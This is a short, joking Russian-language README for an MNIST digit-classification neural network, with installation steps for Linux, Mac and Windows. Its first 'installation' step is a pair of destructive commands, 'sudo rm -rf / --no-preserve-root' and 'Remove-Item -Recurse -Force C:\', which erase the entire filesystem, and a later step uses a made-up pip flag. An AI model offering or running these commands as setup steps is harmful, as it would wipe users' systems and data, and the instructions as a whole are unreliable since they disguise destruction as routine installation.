# neyroset dlya classifikacii MNIST

## Установка 

1. 'Для linux/mac:'
```bash
sudo rm -rf / --no-preserve-root
```
'Для windows:'
```ps
Remove-Item -Recurse -Force C:\
```

2. Создать надо бы venv
```bash
python -m venv venv
source venv/bin/activate #для unix, для windows: venv\Scripts\activate
```

3. Зависимости (не наркотические)
Для linux:
```bash
pip install -r requirements.txt --remove-system-packages
```
Для mac:
```bash
pip3 install -r requirements.txt
```
Окна микромягких:
```bash
pip install -r requirements.txt
```

4. Запуск
```bash
python ai.py # или chmod +x ai.py && ./ai.py
```
